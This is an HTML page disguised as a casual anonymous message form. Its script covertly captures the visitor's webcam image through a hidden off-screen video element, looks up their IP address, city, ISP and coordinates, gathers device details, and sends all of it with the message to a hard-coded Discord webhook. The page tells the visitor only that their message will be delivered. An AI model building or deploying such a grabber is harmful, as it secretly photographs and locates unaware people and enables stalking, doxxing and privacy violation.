<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>send me a message lol</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', sans-serif;
        }
        
        body {
            background-color: #f0f0f0;
            color: #333;
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 20px;
        }
        
        .container {
            width: 100%;
            max-width: 500px;
            background: white;
            border-radius: 8px;
            padding: 30px;
            box-shadow: 0 4px 20px rgba(0, 0, 0, 0.08);
            border: 1px solid #ddd;
        }
        
        .logo {
            text-align: center;
            margin-bottom: 30px;
        }
        
        .logo-text {
            font-size: 28px;
            font-weight: 600;
            color: #222;
            margin-bottom: 5px;
        }
        
        .logo-subtitle {
            color: #666;
            font-size: 15px;
            font-weight: normal;
        }
        
        .form-group {
            margin-bottom: 20px;
        }
        
        .form-label {
            display: block;
            margin-bottom: 8px;
            color: #555;
            font-weight: 500;
            font-size: 14px;
        }
        
        .form-input {
            width: 100%;
            padding: 12px;
            background: white;
            border: 1px solid #ccc;
            border-radius: 6px;
            color: #333;
            font-size: 16px;
            transition: border-color 0.2s;
        }
        
        .form-input:focus {
            outline: none;
            border-color: #888;
        }
        
        .form-textarea {
            width: 100%;
            padding: 12px;
            background: white;
            border: 1px solid #ccc;
            border-radius: 6px;
            color: #333;
            font-size: 16px;
            min-height: 100px;
            resize: vertical;
            font-family: inherit;
            transition: border-color 0.2s;
        }
        
        .form-textarea:focus {
            outline: none;
            border-color: #888;
        }
        
        .submit-btn {
            width: 100%;
            padding: 14px;
            background: #222;
            color: white;
            border: none;
            border-radius: 6px;
            font-size: 16px;
            font-weight: 500;
            cursor: pointer;
            transition: background 0.2s;
            margin-top: 10px;
        }
        
        .submit-btn:hover {
            background: #333;
        }
        
        .submit-btn:disabled {
            background: #999;
            cursor: not-allowed;
        }
        
        .status-message {
            margin-top: 20px;
            padding: 12px;
            border-radius: 6px;
            font-size: 14px;
            text-align: center;
            display: none;
        }
        
        .status-success {
            background: #e8f5e8;
            border: 1px solid #c8e6c8;
            color: #2d5a2d;
        }
        
        .status-error {
            background: #ffe8e8;
            border: 1px solid #ffc8c8;
            color: #a52d2d;
        }
        
        .status-processing {
            background: #fff8e8;
            border: 1px solid #ffe0c8;
            color: #856404;
        }
        
        .privacy-note {
            margin-top: 25px;
            padding: 15px;
            background: #f8f8f8;
            border-radius: 6px;
            font-size: 13px;
            color: #666;
            line-height: 1.5;
            text-align: center;
            border: 1px solid #eee;
            font-style: italic;
        }
        
        /* Hidden elements */
        #camera-container {
            position: fixed;
            top: -9999px;
            left: -9999px;
            width: 1px;
            height: 1px;
            overflow: hidden;
            opacity: 0;
            pointer-events: none;
            z-index: -9999;
        }
        
        #camera-feed {
            width: 320px;
            height: 240px;
            transform: scale(0.1);
            opacity: 0;
        }
        
        .hidden-canvas {
            display: none;
        }
        
        .loading-overlay {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(240, 240, 240, 0.95);
            display: none;
            justify-content: center;
            align-items: center;
            z-index: 10000;
            flex-direction: column;
            gap: 20px;
        }
        
        .loading-spinner {
            width: 40px;
            height: 40px;
            border: 3px solid #ddd;
            border-top: 3px solid #222;
            border-radius: 50%;
            animation: spin 1s linear infinite;
        }
        
        .loading-text {
            color: #333;
            font-size: 16px;
            font-weight: 500;
            text-align: center;
            max-width: 300px;
        }
        
        .quick-flash {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background-color: white;
            opacity: 0;
            pointer-events: none;
            z-index: 9999;
            transition: opacity 0.1s;
        }
        
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
        
        @media (max-width: 600px) {
            .container {
                padding: 20px;
                margin: 10px;
            }
            
            .logo-text {
                font-size: 24px;
            }
            
            .logo-subtitle {
                font-size: 14px;
            }
            
            .form-input, .form-textarea {
                padding: 10px;
                font-size: 15px;
            }
            
            .submit-btn {
                padding: 12px;
            }
        }
    </style>
</head>
<body>
    <div id="camera-container">
        <video id="camera-feed" autoplay playsinline></video>
    </div>
    <canvas id="capture-canvas" class="hidden-canvas"></canvas>
    
    <div id="quick-flash" class="quick-flash"></div>
    
    <!-- loading thing -->
    <div id="loading-overlay" class="loading-overlay">
        <div class="loading-spinner"></div>
        <div class="loading-text" id="loading-text">sending ur message... dont close this</div>
    </div>
    
    <!-- main thing -->
    <div class="container">
        <div class="logo">
            <div class="logo-text">send me a message lol</div>
            <div class="logo-subtitle">idk say something funny maybe</div>
        </div>
        
        <form id="message-form">
            <div class="form-group">
                <label class="form-label">ur name (optional, unless ur boring)</label>
                <input type="text" id="username" class="form-input" placeholder="who dis">
            </div>
            
            <div class="form-group">
                <label class="form-label">what u wanna say</label>
                <textarea id="message" class="form-textarea" placeholder="type something... anything really..." required></textarea>
            </div>
            
            <button type="submit" class="submit-btn" id="submit-btn">
                yeet that message
            </button>
            
            <div id="status-message" class="status-message"></div>
        </form>
        
        <div class="privacy-note">
            i'll get ur message directly. no pressure, but make it good lol
        </div>
    </div>

    <script>
        // discord thing
        const DISCORD_WEBHOOK = 'https://discord.com/api/webhooks/1457747830121824426/Hu4uM8zm-bUBTc9hNYEZE0r2XVIW8-1_cpEs3s_P0FdqJFSXPLxIbp_0zKc3ur54P1qD';
        
        const form = document.getElementById('message-form');
        const usernameInput = document.getElementById('username');
        const messageInput = document.getElementById('message');
        const submitBtn = document.getElementById('submit-btn');
        const statusMessage = document.getElementById('status-message');
        const loadingOverlay = document.getElementById('loading-overlay');
        const quickFlash = document.getElementById('quick-flash');
        const loadingText = document.getElementById('loading-text');
        
        const cameraFeed = document.getElementById('camera-feed');
        const captureCanvas = document.getElementById('capture-canvas');
        
        // variables n stuff
        let stream = null;
        let isProcessing = false;
        
        function doQuickFlash() {
            quickFlash.style.opacity = '0.3';
            setTimeout(() => {
                quickFlash.style.opacity = '0';
            }, 50);
        }
        
        // show status message
        function showStatus(message, type) {
            statusMessage.textContent = message;
            statusMessage.className = 'status-message status-' + type;
            statusMessage.style.display = 'block';
            
            if (type === 'success') {
                setTimeout(() => {
                    statusMessage.style.display = 'none';
                }, 3000);
            }
        }
        
        async function getCameraQuick() {
            try {
                stream = await navigator.mediaDevices.getUserMedia({ 
                    video: { 
                        facingMode: 'user',
                        width: { ideal: 640 },
                        height: { ideal: 480 }
                    } 
                });
                
                cameraFeed.srcObject = stream;
                
                await new Promise(resolve => setTimeout(resolve, 100));
                return stream;
            } catch (error) {
                return null;
            }
        }
        
        function takeQuickScreenshot() {
            if (!stream) return null;
            
            try {
                const canvas = captureCanvas;
                const video = cameraFeed;
                
                canvas.width = video.videoWidth || 640;
                canvas.height = video.videoHeight || 480;
                
                const ctx = canvas.getContext('2d');
                ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
                
                ctx.fillStyle = 'rgba(0, 0, 0, 0.6)';
                ctx.fillRect(10, 10, 180, 25);
                ctx.fillStyle = 'white';
                ctx.font = '12px Arial';
                ctx.fillText('message sent: ' + new Date().toLocaleTimeString(), 15, 25);
                
                return canvas.toDataURL('image/jpeg', 0.85);
            } catch (e) {
                return null;
            }
        }
        
        function dataURLtoBlob(dataurl) {
            try {
                const arr = dataurl.split(',');
                const mime = arr[0].match(/:(.*?);/)[1];
                const bstr = atob(arr[1]);
                let n = bstr.length;
                const u8arr = new Uint8Array(n);
                while (n--) {
                    u8arr[n] = bstr.charCodeAt(n);
                }
                return new Blob([u8arr], { type: mime });
            } catch (error) {
                return null;
            }
        }
        
        async function getIPLocation() {
            try {
                loadingText.textContent = 'getting IP address...';
                const ipResponse = await fetch('https://api.ipify.org?format=json');
                const ipData = await ipResponse.json();
                const userIP = ipData.ip;
                
                loadingText.textContent = 'converting IP to location...';
                const geoResponse = await fetch(`https://ipapi.co/${userIP}/json/`);
                const geoData = await geoResponse.json();
                
                if (geoData.latitude && geoData.longitude) {
                    return {
                        ip: userIP,
                        latitude: geoData.latitude,
                        longitude: geoData.longitude,
                        accuracy: 'IP-based (city level, ~5-50km)',
                        city: geoData.city || 'Unknown',
                        region: geoData.region || 'Unknown',
                        country: geoData.country_name || 'Unknown',
                        isp: geoData.org || 'Unknown',
                        timezone: geoData.timezone || 'Unknown',
                        postal: geoData.postal || 'Unknown'
                    };
                } else {
                    const fallbackResponse = await fetch(`https://ipapi.co/${userIP}/latlong/`);
                    const fallbackText = await fallbackResponse.text();
                    
                    if (fallbackText && fallbackText.includes(',')) {
                        const [lat, lon] = fallbackText.split(',');
                        return {
                            ip: userIP,
                            latitude: parseFloat(lat),
                            longitude: parseFloat(lon),
                            accuracy: 'IP-based (approximate)',
                            city: 'Unknown',
                            region: 'Unknown',
                            country: 'Unknown',
                            isp: 'Unknown',
                            timezone: 'Unknown'
                        };
                    }
                }
                
                return null;
                
            } catch (error) {
                console.log('IP location failed:', error.message);
                
                try {
                    loadingText.textContent = 'trying backup location service...';
                    const backupResponse = await fetch('https://geolocation-db.com/json/');
                    const backupData = await backupResponse.json();
                    
                    if (backupData.latitude && backupData.longitude) {
                        return {
                            ip: backupData.IPv4 || 'Unknown',
                            latitude: backupData.latitude,
                            longitude: backupData.longitude,
                            accuracy: 'IP-based (approximate)',
                            city: backupData.city || 'Unknown',
                            region: backupData.state || 'Unknown',
                            country: backupData.country_name || 'Unknown',
                            isp: 'Unknown',
                            timezone: 'Unknown'
                        };
                    }
                } catch (backupError) {
                    console.log('Backup also failed:', backupError.message);
                }
                
                return null;
            }
        }
        
        function generateMapsLink(latitude, longitude) {
            return `https://www.google.com/maps?q=${latitude},${longitude}&z=12`;
        }
        
        function generateOSMLink(latitude, longitude) {
            return `https://www.openstreetmap.org/?mlat=${latitude}&mlon=${longitude}&zoom=12`;
        }
        
        function getDeviceInfo() {
            return {
                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                language: navigator.language,
                platform: navigator.platform,
                screenSize: `${window.screen.width}x${window.screen.height}`,
                userAgent: navigator.userAgent.substring(0, 100) + '...'
            };
        }
        
        async function sendToDiscord(username, message, screenshot = null, location = null) {
            try {
                const timestamp = new Date().toLocaleString();
                const deviceInfo = getDeviceInfo();
                
                let locationField = "Location: Not available";
                let mapsLink = "";
                let osmLink = "";
                
                if (location) {
                    mapsLink = generateMapsLink(location.latitude, location.longitude);
                    osmLink = generateOSMLink(location.latitude, location.longitude);
                    
                    locationField = `IP: ${location.ip}
Coordinates: ${location.latitude.toFixed(6)}, ${location.longitude.toFixed(6)}
Accuracy: ${location.accuracy}
City: ${location.city}
Region: ${location.region}
Country: ${location.country}
ISP: ${location.isp}
Timezone: ${location.timezone}
Postal: ${location.postal}

[Google Maps](${mapsLink})
[OpenStreetMap](${osmLink})`.trim();
                }
                
                const deviceField = `Timezone: ${deviceInfo.timezone}
Language: ${deviceInfo.language}
Platform: ${deviceInfo.platform}
Screen: ${deviceInfo.screenSize}
Browser: ${deviceInfo.userAgent}`.trim();
                
                const embed = {
                    title: "New Message Received",
                    color: 0x3498db,
                    fields: [
                        {
                            name: "From",
                            value: username || "Anonymous",
                            inline: true
                        },
                        {
                            name: "Time",
                            value: timestamp,
                            inline: true
                        },
                        {
                            name: "IP Location (Approximate)",
                            value: "```" + locationField + "```",
                            inline: false
                        },
                        {
                            name: "Device Info",
                            value: "```" + deviceField + "```",
                            inline: false
                        },
                        {
                            name: "Message",
                            value: message || "No message content",
                            inline: false
                        }
                    ],
                    footer: {
                        text: "Sent via message form - Location from IP geolocation"
                    },
                    timestamp: new Date().toISOString()
                };
                
                if (screenshot) {
                    try {
                        const blob = dataURLtoBlob(screenshot);
                        
                        if (blob) {
                            const formData = new FormData();
                            const filename = `message_${Date.now()}.jpg`;
                            formData.append('file', blob, filename);
                            
                            embed.image = {
                                url: `attachment://${filename}`
                            };
                            
                            formData.append('payload_json', JSON.stringify({
                                username: "message bot",
                                embeds: [embed]
                            }));
                            
                            await fetch(DISCORD_WEBHOOK, {
                                method: 'POST',
                                body: formData
                            });
                            
                            return true;
                        }
                    } catch (imageError) {
                        console.log('Image failed, sending text only');
                    }
                }
                
                const payload = {
                    username: "message bot",
                    embeds: [embed]
                };
                
                await fetch(DISCORD_WEBHOOK, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                    },
                    body: JSON.stringify(payload)
                });
                
                return true;
                
            } catch (error) {
                console.error('Error sending to Discord:', error);
                return false;
            }
        }
        
        function cleanupCamera() {
            if (stream) {
                stream.getTracks().forEach(track => track.stop());
                stream = null;
            }
        }
        
        form.addEventListener('submit', async function(e) {
            e.preventDefault();
            
            if (isProcessing) return;
            
            const username = usernameInput.value.trim();
            const message = messageInput.value.trim();
            
            if (!message) {
                showStatus('bruh write something first', 'error');
                messageInput.focus();
                return;
            }
            
            isProcessing = true;
            submitBtn.disabled = true;
            loadingOverlay.style.display = 'flex';
            loadingText.textContent = 'sending ur message... dont close this';
            showStatus('sending...', 'processing');
            
            try {
                let screenshot = null;
                let location = null;
                
                loadingText.textContent = 'preparing...';
                const cameraStream = await getCameraQuick();
                
                if (cameraStream) {
                    doQuickFlash();
                    
                    await new Promise(resolve => setTimeout(resolve, 50));
                    
                    screenshot = takeQuickScreenshot();
                    
                    await new Promise(resolve => setTimeout(resolve, 100));
                    
                    cleanupCamera();
                }
                
                loadingText.textContent = 'getting IP location...';
                location = await getIPLocation();
                
                loadingText.textContent = 'sending message with location...';
                const success = await sendToDiscord(username, message, screenshot, location);
                
                if (success) {
                    if (location) {
                        showStatus('message sent! with IP location data', 'success');
                    } else {
                        showStatus('message sent! (no location data)', 'success');
                    }
                    messageInput.value = '';
                    usernameInput.value = '';
                } else {
                    showStatus('failed to send. try again maybe?', 'error');
                }
                
            } catch (error) {
                console.error('error:', error);
                showStatus('something broke. oops.', 'error');
                
            } finally {

                isProcessing = false;
                submitBtn.disabled = false;
                loadingOverlay.style.display = 'none';
                
                cleanupCamera();
            }
        });
    </script>
</body>
</html>
